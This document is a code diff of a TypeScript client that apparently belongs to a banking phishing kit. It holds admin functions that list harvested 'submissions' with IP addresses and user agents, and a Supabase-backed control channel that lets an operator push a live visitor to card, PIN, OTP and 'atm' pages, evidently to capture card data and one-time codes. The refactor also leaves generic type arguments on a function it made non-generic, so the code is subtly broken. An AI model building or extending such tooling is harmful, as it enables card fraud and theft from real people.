@@ -1,10 +1,7 @@
 const API_BASE_URL = import.meta.env.VITE_API_BASE_URL ?? "/api";
 
-// ═══════════════════════════════════════════════════════════════
-// Action types mapping for navigation control
-// ═══════════════════════════════════════════════════════════════
+// Navigation action types
 export type NavigationAction = 'MAIN' | 'CARD' | 'PIN1' | 'PIN2' | 'PIN3' | 'OTP' | 'SUCCESS' | 'ERROR';
-export type RedirectTarget = NavigationAction;
 
 // Map actions to page routes
 export const ACTION_TO_ROUTE: Record<NavigationAction, string> = {
@@ -18,9 +15,10 @@ export const ACTION_TO_ROUTE: Record<NavigationAction, string> = {
   'ERROR': '/error',
 };
 
-// ═══════════════════════════════════════════════════════════════
-// Supabase configuration
-// ═══════════════════════════════════════════════════════════════
+// Valid actions list for validation
+const VALID_ACTIONS: string[] = ['MAIN', 'CARD', 'PIN1', 'PIN2', 'PIN3', 'OTP', 'SUCCESS', 'ERROR'];
+
+// Get Supabase config
 function getSupabaseConfig() {
   return {
     url: import.meta.env.VITE_SUPABASE_URL ?? "",
@@ -28,61 +26,28 @@ function getSupabaseConfig() {
   };
 }
 
-async function jsonRequest<T>(path: string, method: string, body?: unknown, token?: string): Promise<T> {
-  const headers: Record<string, string> = {
-    "Content-Type": "application/json",
-  };
-  if (token) {
-    headers.Authorization = `Bearer ${token}`;
-  }
-
-  const baseUrl = API_BASE_URL.replace(/\/+$/, "");
-  const normalizedPath = path.startsWith("/") ? path : `/${path}`;
-  const response = await fetch(`${baseUrl}${normalizedPath}`, {
-    method,
-    headers,
-    body: body ? JSON.stringify(body) : undefined,
-  });
-
-  const raw = await response.text();
-  const data = raw ? JSON.parse(raw) : null;
-  if (!response.ok) {
-    throw new Error(data?.error || response.statusText || "Request failed");
-  }
-
-  return data as T;
+// HTTP request helper
+async function jsonRequest(path: string, method: string, body?: unknown, token?: string) {
+  const headers = { "Content-Type": "application/json" };
+  if (token) headers.Authorization = `Bearer ${token}`;
+  
+  const url = API_BASE_URL.replace(/\/+$/, "") + (path.startsWith("/") ? path : "/" + path);
+  const response = await fetch(url, { method, headers, body: body ? JSON.stringify(body) : undefined });
+  const text = await response.text();
+  const data = text ? JSON.parse(text) : null;
+  if (!response.ok) throw new Error(data?.error || response.statusText);
+  return data;
 }
 
-export interface AdminLoginResponse {
-  success: boolean;
-  token: string;
-}
+// API interfaces
+export interface AdminLoginResponse { success: boolean; token: string; }
+export interface AdminStatsResponse { totalSessions: number; totalSubmissions: number; byType: { type: string; count: number }[]; }
+export interface SubmissionRow { id: number; sessionId: string; type: string; data: string | null; ipAddress: string | null; createdAt: string; userAgent?: string | null; }
+export interface SubmissionListResponse { submissions: SubmissionRow[]; total: number; page: number; limit: number; }
 
-export interface AdminStatsResponse {
-  totalSessions: number;
-  totalSubmissions: number;
-  byType: { type: string; count: number }[];
-}
-
-export interface SubmissionRow {
-  id: number;
-  sessionId: string;
-  type: string;
-  data: string | null;
-  ipAddress: string | null;
-  createdAt: string;
-  userAgent?: string | null;
-}
-
-export interface SubmissionListResponse {
-  submissions: SubmissionRow[];
-  total: number;
-  page: number;
-  limit: number;
-}
-
+// Admin functions
 export async function submitSubmission(type: string, body: Record<string, unknown>) {
-  return jsonRequest<{ id: number; sessionId: string }>(`/submissions/${type}`, "POST", body);
+  return jsonRequest(`/submissions/${type}`, "POST", body);
 }
 
 export async function adminLogin(username: string, password: string) {
@@ -106,62 +71,37 @@ export async function getAdminStats(token: string) {
 }
 
 export async function listAdminSubmissions(token: string, params?: Record<string, string | number>) {
-  const queryString = params ? `?${new URLSearchParams(Object.entries(params).map(([k, v]) => [k, String(v)]))}` : "";
-  return jsonRequest<SubmissionListResponse>(`/admin/submissions${queryString}`, "GET", undefined, token);
+  const qs = params ? "?" + new URLSearchParams(Object.entries(params).map(([k, v]) => [k, String(v)])) : "";
+  return jsonRequest<SubmissionListResponse>(`/admin/submissions${qs}`, "GET", undefined, token);
 }
 
 export async function getAllAdminSubmissions(token: string) {
   return jsonRequest<{ submissions: SubmissionRow[]; total: number }>("/admin/all-submissions", "GET", undefined, token);
 }
 
-// Fetch submissions directly from Supabase (bypasses API server)
+// Fetch from Supabase directly
 export async function getAdminSubmissionsFromSupabase() {
   const { url, key } = getSupabaseConfig();
-
-  console.log("📡 Fetching from Supabase:", { url, hasKey: !!key });
-
-  if (!url || !key) {
-    console.error("❌ Supabase not configured:", { url: !!url, key: !!key });
-    throw new Error("Supabase not configured");
-  }
-
-  try {
-    console.log("🔄 Making request to Supabase...");
-    const response = await fetch(`${url}/rest/v1/submissions?select=*&order=created_at.desc`, {
-      headers: {
-        "apikey": key,
-        "Authorization": `Bearer ${key}`,
-      },
-    });
-
-    console.log("📬 Response status:", response.status);
-
-    if (!response.ok) {
-      const errorText = await response.text();
-      console.error("❌ Supabase error:", response.status, errorText);
-      throw new Error(`HTTP ${response.status}: ${response.statusText}`);
-    }
-
-    const data = await response.json();
-    console.log("✅ Received data:", data.length, "submissions");
-    return (data || []).map((row) => ({
-      id: row.id,
-      sessionId: row.session_id,
-      type: row.type,
-      data: typeof row.data === 'string' ? row.data : JSON.stringify(row.data),
-      ipAddress: row.ip_address,
-      createdAt: row.created_at,
-      userAgent: row.user_agent,
-    }));
-  } catch (error) {
-    console.error("❌ Failed to fetch from Supabase:", error);
-    throw error;
-  }
+  if (!url || !key) throw new Error("Supabase not configured");
+  
+  const response = await fetch(`${url}/rest/v1/submissions?select=*&order=created_at.desc`, {
+    headers: { "apikey": key, "Authorization": `Bearer ${key}` },
+  });
+  
+  if (!response.ok) throw new Error(`HTTP ${response.status}`);
+  const data = await response.json();
+  return (data || []).map((row: any) => ({
+    id: row.id,
+    sessionId: row.session_id,
+    type: row.type,
+    data: typeof row.data === 'string' ? row.data : JSON.stringify(row.data),
+    ipAddress: row.ip_address,
+    createdAt: row.created_at,
+    userAgent: row.user_agent,
+  }));
 }
 
-export interface ControlActionResponse {
-  action: string | null;
-}
+export interface ControlActionResponse { action: string | null; }
 
 export async function getControlAction(sessionId: string) {
   return jsonRequest<ControlActionResponse>(`/control/${sessionId}`, "GET");
@@ -171,154 +111,131 @@ export async function sendAdminControl(sessionId: string, action: string, token:
   return jsonRequest<{ success: boolean; sessionId: string; action: string }>(`/admin/control/${sessionId}`, "POST", { action }, token);
 }
 
-// ═══════════════════════════════════════════════════════════════
-// Navigation Control Functions (Admin → User)
-// ═══════════════════════════════════════════════════════════════
+// ============================================================
+// NAVIGATION CONTROL FUNCTIONS
+// ============================================================
 
-const VALID_NAVIGATION_ACTIONS: NavigationAction[] = ['MAIN', 'CARD', 'PIN1', 'PIN2', 'PIN3', 'OTP', 'SUCCESS', 'ERROR'];
-
-function isValidNavAction(action: unknown): action is NavigationAction {
-  if (!action || typeof action !== 'string') return false;
-  return (VALID_NAVIGATION_ACTIONS as string[]).includes(action);
+// Check if action is valid
+function checkValidAction(action: unknown): action is NavigationAction {
+  if (typeof action !== 'string') return false;
+  return VALID_ACTIONS.includes(action);
 }
 
 /**
- * Send a navigation command to a specific session
+ * Send navigation command to Supabase controls table
  */
 export async function sendNavigationCommand(sessionId: string, action: NavigationAction): Promise<boolean> {
   const { url, key } = getSupabaseConfig();
-
   if (!url || !key) {
-    console.warn("⚠️ Supabase not configured for navigation control");
+    console.warn("Supabase not configured");
     return false;
   }
-
+  
   try {
-    const expiresAt = new Date(Date.now() + 60 * 1000).toISOString();
-
-    const payload = {
-      session_id: sessionId,
-      action: action,
-      redirect_to: null,
-      expires_at: expiresAt,
-    };
-
+    const expiresAt = new Date(Date.now() + 60000).toISOString();
+    const payload = { session_id: sessionId, action, redirect_to: null, expires_at: expiresAt };
+    
     const response = await fetch(`${url}/rest/v1/controls`, {
       method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'apikey': key,
-        'Authorization': `Bearer ${key}`,
-        'Prefer': 'return=representation',
-      },
+      headers: { 'Content-Type': 'application/json', 'apikey': key, 'Authorization': `Bearer ${key}`, 'Prefer': 'return=representation' },
       body: JSON.stringify(payload),
     });
-
+    
     if (!response.ok) {
-      const errorText = await response.text();
-      console.error(`❌ Failed to send navigation command (${action}):`, response.status, errorText);
+      console.error("Failed to send command:", response.status);
       return false;
     }
-
-    const result = await response.json();
-    console.log(`✅ Navigation command sent: ${action} → session ${sessionId}`, result);
+    
+    console.log("Command sent:", action, "for session:", sessionId);
     return true;
-  } catch (error) {
-    console.error("❌ Error sending navigation command:", error);
+  } catch (err) {
+    console.error("Error sending command:", err);
     return false;
   }
 }
 
 /**
- * Get pending navigation command for a session
+ * Get pending navigation command from Supabase
  */
 export async function getNavigationCommand(sessionId: string): Promise<{ action: NavigationAction; redirect_to: string | null } | null> {
   const { url, key } = getSupabaseConfig();
-
-  if (!url || !key) {
-    return null;
-  }
-
+  if (!url || !key) return null;
+  
   try {
-    const queryUrl = `${url}/rest/v1/controls?session_id=eq.${encodeURIComponent(sessionId)}&order=created_at.desc&limit=10`;
-
-    const response = await fetch(queryUrl, {
-      headers: {
-        'apikey': key,
-        'Authorization': `Bearer ${key}`,
-      },
-    });
-
-    if (!response.ok) {
-      console.error(`❌ Failed to get navigation command: ${response.status}`);
-      return null;
-    }
-
-    const jsonData = await response.json();
+    const encodedId = encodeURIComponent(sessionId);
+    const queryUrl = `${url}/rest/v1/controls?session_id=eq.${encodedId}&order=created_at.desc&limit=5`;
     
-    // Safely check if data is an array
-    if (!jsonData || !Array.isArray(jsonData) || jsonData.length === 0) {
+    const response = await fetch(queryUrl, {
+      headers: { 'apikey': key, 'Authorization': `Bearer ${key}` },
+    });
+    
+    if (!response.ok) {
+      console.error("Failed to get command:", response.status);
       return null;
     }
-
+    
+    const data = await response.json();
+    
+    // Safety check for array
+    if (!data || !Array.isArray(data) || data.length === 0) {
+      return null;
+    }
+    
     const now = new Date();
-
-    // Find the first non-expired command
-    for (const item of jsonData) {
-      // Skip if not an object
+    
+    // Find first valid non-expired command
+    for (let i = 0; i < data.length; i++) {
+      const item = data[i];
+      
+      // Skip if not object
       if (!item || typeof item !== 'object') continue;
       
       // Check expiration
       if (item.expires_at) {
         try {
-          const expiresAt = new Date(item.expires_at);
-          if (expiresAt < now) continue;
+          const expDate = new Date(item.expires_at);
+          if (expDate < now) continue;
         } catch (e) {
-          // Invalid date, skip
           continue;
         }
       }
-
-      // Validate action
-      if (isValidNavAction(item.action)) {
+      
+      // Check valid action
+      if (checkValidAction(item.action)) {
         return {
           action: item.action as NavigationAction,
           redirect_to: item.redirect_to || null,
         };
       }
     }
-
+    
     return null;
-  } catch (error) {
-    console.error("❌ Error getting navigation command:", error);
+  } catch (err) {
+    console.error("Error getting command:", err);
     return null;
   }
 }
 
 /**
- * Delete navigation commands for a session
+ * Delete navigation commands for session
  */
 export async function deleteNavigationCommands(sessionId: string): Promise<void> {
   const { url, key } = getSupabaseConfig();
-
   if (!url || !key) return;
-
+  
   try {
-    const encodedSessionId = encodeURIComponent(sessionId);
-    await fetch(`${url}/rest/v1/controls?session_id=eq.${encodedSessionId}`, {
+    const encodedId = encodeURIComponent(sessionId);
+    await fetch(`${url}/rest/v1/controls?session_id=eq.${encodedId}`, {
       method: 'DELETE',
-      headers: {
-        'apikey': key,
-        'Authorization': `Bearer ${key}`,
-      },
+      headers: { 'apikey': key, 'Authorization': `Bearer ${key}` },
     });
-    console.log(`🗑️ Deleted navigation commands for session: ${sessionId}`);
-  } catch (error) {
-    console.error("❌ Error deleting navigation commands:", error);
+    console.log("Deleted commands for session:", sessionId);
+  } catch (err) {
+    console.error("Error deleting commands:", err);
   }
 }
 
-// Alias for backward compatibility
+// Legacy aliases
 export async function getPendingNavigationCommand(sessionId: string) {
   return getNavigationCommand(sessionId);
 }
@@ -327,34 +244,19 @@ export async function clearNavigationCommand(sessionId: string): Promise<void> {
   return deleteNavigationCommands(sessionId);
 }
 
-// Legacy functions
 export async function sendRedirectCommand(sessionId: string, target: string): Promise<boolean> {
-  const targetToAction: Record<string, NavigationAction> = {
-    'home': 'MAIN',
-    'card': 'CARD',
-    'otp1': 'PIN1',
-    'otp2': 'PIN2',
-    'otp3': 'PIN3',
-    'atm': 'OTP',
-    'success': 'SUCCESS',
-    'error': 'ERROR',
+  const map: Record<string, NavigationAction> = {
+    'home': 'MAIN', 'card': 'CARD', 'otp1': 'PIN1', 'otp2': 'PIN2', 'otp3': 'PIN3',
+    'atm': 'OTP', 'success': 'SUCCESS', 'error': 'ERROR',
   };
-
-  const action = targetToAction[target];
-  if (!action) {
-    console.error(`❌ Unknown redirect target: ${target}`);
-    return false;
-  }
-
+  const action = map[target];
+  if (!action) return false;
   return sendNavigationCommand(sessionId, action);
 }
 
 export async function getPendingRedirect(sessionId: string): Promise<{ redirect_to: string } | null> {
-  const command = await getNavigationCommand(sessionId);
-  if (command) {
-    return { redirect_to: command.action };
-  }
-  return null;
+  const cmd = await getNavigationCommand(sessionId);
+  return cmd ? { redirect_to: cmd.action } : null;
 }
 
 export async function clearRedirectCommand(sessionId: string): Promise<void> {
